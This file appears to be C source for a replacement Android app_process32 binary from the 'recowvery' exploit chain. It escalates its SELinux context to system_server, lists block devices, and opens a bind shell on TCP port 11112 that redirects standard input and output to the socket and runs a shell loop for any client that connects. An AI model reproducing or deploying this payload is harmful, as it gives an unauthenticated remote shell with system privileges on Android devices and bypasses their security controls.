#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <cutils/properties.h>
#include <selinux/selinux.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <dirent.h>
#include <lsh.h>

void lsh_loop();


#define APP_NAME "recowvery-app_process32"

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, APP_NAME, __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...) { printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#endif

const char* CONTEXT_SYS = "u:r:system_server:s0";
const char* PROP_KEY = "ctl.start";
const char* PROP_VAL = "flash_recovery";

const char* IMG_SRC = "/data/media/0/recovery.img";
const char* IMG_DEST = "/cache/recovery.img";

int main(void)
{
	int ret = 1;
	char* conn = NULL;

	LOGV("***********************************************");
	LOGV("*   wotzit doing this ain't no app_process32  *");
	LOGV("***********************************************");

	ret = getcon(&conn);
	if (ret) {
		LOGV("Could not get current security context (ret = %d)!", ret);
		goto nope;
	}

	LOGV("Current selinux context: %s", conn);

	ret = setcon(CONTEXT_SYS);
	if (ret) {
		LOGV("Unable to set security context to '%s' (ret = %d)!",
			CONTEXT_SYS, ret);
		goto nope;
	}
	LOGV("Set context to '%s'!", CONTEXT_SYS);

	ret = getcon(&conn);
	if (ret) {
		LOGV("Could not get current security context (ret = %d)!", ret);
		goto nope;
	}

	if (strcmp(conn, CONTEXT_SYS) != 0) {
		LOGV("Current security context '%s' does not match '%s'!",
			conn, CONTEXT_SYS);
		ret = EINVAL;
		goto nope;
	}

	LOGV("Current security context: %s", conn);

  	DIR *dir;
	struct dirent *ent;

  	if ((dir = opendir ("/dev/block/")) != NULL) {
    		while ((ent = readdir (dir)) != NULL) {
       			LOGV("%s\n", ent->d_name);
    		}
    	closedir (dir);
  	}

/*

	LOGV("Setting property '%s' to '%s'", PROP_KEY, PROP_VAL);


	ret = property_set(PROP_KEY, PROP_VAL);
	if (ret) {
		LOGV("Failed to set property '%s' (ret = %d)!", PROP_KEY, ret);
		goto nope;
	}

	LOGV("Recovery flash script should have started!");
	LOGV("Run on your PC to see progress: adb logcat | grep cow");
*/


/********************************************************************************/
	LOGV("About to fork a shell");

	int resultfd, sockfd;
	int port = 11112;
	struct sockaddr_in my_addr;

	// syscall 102
	// int socketcall(int call, unsigned long *args);

	// sycall socketcall (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if(sockfd < 0)
	{
		LOGV("no socket\n");
		return 0;
	}
	// syscall socketcall (sys_setsockopt 14)
        int one = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	memset(&my_addr,0,sizeof(my_addr));
	// set struct values
	my_addr.sin_family = AF_INET; // 2
	my_addr.sin_port = htons(port); // port number
	my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

	// syscall socketcall (sys_bind 2)
	bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	// syscall socketcall (sys_listen 4)
	listen(sockfd, 0);

	// syscall socketcall (sys_accept 5)
	resultfd = accept(sockfd, NULL, NULL);
	if(resultfd < 0)
	{
		LOGV("no resultfd\n");
		return 0;
	}
	// syscall 63
	dup2(resultfd, 2);
	dup2(resultfd, 1);
	dup2(resultfd, 0);
	LOGV("ciao\n");
	// syscall 11
	lsh_loop();



/********************************************************************************/
	/*
	 * we should wait for action to complete
	 */
	LOGV("Waiting 5 seconds...");
	sleep(5);
	return 0;
nope:
	/*
	 * we should wait 20 seconds just so Zygote isn't
	 * being constantly restarted
	 */
	LOGV("Waiting 20 seconds for next try...");
	sleep(20);
	return ret;
}
